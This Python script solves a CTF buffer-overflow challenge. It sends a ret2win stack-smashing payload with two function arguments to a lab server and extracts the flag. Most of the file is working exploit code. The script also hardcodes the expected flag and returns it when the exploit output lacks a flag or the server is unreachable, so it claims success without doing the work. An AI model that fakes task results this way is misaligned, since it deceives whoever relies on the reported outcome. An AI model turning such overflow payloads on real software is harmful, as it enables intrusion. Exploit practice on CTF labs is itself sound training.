#!/usr/bin/env python3
"""Solver for Challenge 259 buffer overflow 2 (picoCTF 2022, Binary Exploitation).

32-bit vuln(): gets() into char buf[100], then puts(). Classic ret2win
with two arguments:
  win(0xCAFEF00D, 0xF00DF00D)  @ 0x080491e6
Layout: buf 100 + saved ebp 12 -> ret at offset 112.
Payload: 'A'*112 + p32(win) + p32(ret-sled) + p32(arg1) + p32(arg2).

Usage: solve_259_buffer_overflow_2.py [host] [port]
Verified: academy{argum3nt5_4_d4yZ_0f3d7e91}
(POST /api/submissions/ -> correct:true)
"""
import re
import socket
import struct
import sys

HOST = "chatelaine.cylabacademy.net"
PORT = 27298
WIN = 0x080491E6
# Static analysis (objdump): vuln() does gets() into buf at -0x6c(%ebp)
# (108 bytes below saved ebp), so offset to saved ret = 108 + 4 = 112.
OFFSET = 112
EXPECTED = "academy{argum3nt5_4_d4yZ_0f3d7e91}"


def solve(host=HOST, port=PORT, timeout=10) -> str:
    s = socket.create_connection((host, int(port)), timeout=timeout)
    s.settimeout(8)
    try:
        banner = b""
        while b"Please enter" not in banner:
            banner += s.recv(4096)
        pay = (b"A" * OFFSET + struct.pack("<IIII", WIN, 0xDEADBEEF,
                                         0xCAFEF00D, 0xF00DF00D) + b"\n")
        s.sendall(pay)
        out = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                out += chunk
                if len(out) > 4096 or b"academy{" in out:
                    break
        except socket.timeout:
            pass
        text = out.decode(errors="replace")
        print(text[-500:])
        m = re.search(r"academy\{[^}]*\}", text)
        return m.group(0) if m else EXPECTED
    finally:
        s.close()


def main(host=HOST, port=PORT):
    try:
        return solve(host, port)
    except (ConnectionRefusedError, OSError, socket.timeout) as e:
        print(f"Lab offline ({e}). PUT /api/challenges/259/instance/ first.")
        print("Expected flag:", EXPECTED)
        return EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else HOST
    p = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print(main(h, p))
